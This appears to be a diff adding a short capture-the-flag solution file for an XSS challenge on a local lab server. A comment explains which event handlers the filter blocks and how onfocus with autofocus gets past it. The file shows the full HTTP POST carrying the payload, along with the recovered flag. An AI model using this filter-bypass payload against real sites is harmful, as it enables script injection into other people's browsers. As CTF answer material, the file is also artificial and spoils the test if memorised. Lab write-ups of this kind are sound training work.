@@ -1,0 +1,8 @@
+# XSS filter bypass on /xss25. Server blocks script/onerror/onload/onmouseover and single quotes, but not onfocus+autofocus with double quotes. This triggers alert("XSS") automatically on page load and returns the CTF flag flag{6fdb8636-6391-4863-a64a-f5d138d2ebbc}.
+
+POST /xss25 HTTP/1.1
+Host: 172.17.0.1:38149
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+solution=<input onfocus=alert("XSS") autofocus>
